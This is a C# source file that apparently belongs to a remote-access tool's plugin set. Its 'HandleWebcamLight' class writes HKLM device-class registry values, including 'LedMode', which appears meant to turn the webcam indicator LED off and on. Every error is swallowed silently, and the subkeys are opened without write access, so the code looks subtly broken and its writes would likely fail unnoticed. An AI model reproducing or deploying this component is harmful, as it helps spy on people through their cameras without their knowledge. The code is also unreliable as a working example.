using System;
using System.Linq;
using System.Text.RegularExpressions;
using Microsoft.Win32;

namespace Plugin.Handler
{
    internal class HandleWebcamLight
    {
        public void Disable()
        {
            try
            {
                using (var registryKey =
                       Registry.LocalMachine.OpenSubKey(
                           "SYSTEM\\CurrentControlSet\\Control\\Class\\{6BDD1FC6-810F-11D0-BEC7-08002BE2092F}"))
                {
                    foreach (var name in from x in registryKey.GetSubKeyNames()
                             where Regex.IsMatch(x, "[0-9]{4}")
                             select x)
                        using (var registryKey2 = registryKey.OpenSubKey(name))
                        {
                            registryKey2.SetValue("", 8, RegistryValueKind.DWord);
                        }
                }
            }
            catch (Exception)
            {
            }

            try
            {
                using (var registryKey3 =
                       Registry.LocalMachine.OpenSubKey(
                           "SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002BE10318}"))
                {
                    foreach (var name2 in from x in registryKey3.GetSubKeyNames()
                             where Regex.IsMatch(x, "[0-9]{4}")
                             select x)
                        using (var registryKey4 = registryKey3.OpenSubKey(name2))
                        {
                            registryKey4.SetValue("LedMode", 1, RegistryValueKind.DWord);
                        }
                }
            }
            catch (Exception)
            {
            }
        }

        public void Enable()
        {
            try
            {
                using (var registryKey =
                       Registry.LocalMachine.OpenSubKey(
                           "SYSTEM\\CurrentControlSet\\Control\\Class\\{6BDD1FC6-810F-11D0-BEC7-08002BE2092F}"))
                {
                    foreach (var name in from x in registryKey.GetSubKeyNames()
                             where Regex.IsMatch(x, "[0-9]{4}")
                             select x)
                        using (var registryKey2 = registryKey.OpenSubKey(name))
                        {
                            registryKey2.SetValue("", 0, RegistryValueKind.DWord);
                        }
                }
            }
            catch (Exception)
            {
            }

            try
            {
                using (var registryKey3 =
                       Registry.LocalMachine.OpenSubKey(
                           "SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002BE10318}"))
                {
                    foreach (var name2 in from x in registryKey3.GetSubKeyNames()
                             where Regex.IsMatch(x, "[0-9]{4}")
                             select x)
                        using (var registryKey4 = registryKey3.OpenSubKey(name2))
                        {
                            registryKey4.SetValue("LedMode", 0, RegistryValueKind.DWord);
                        }
                }
            }
            catch (Exception)
            {
            }
        }
    }
}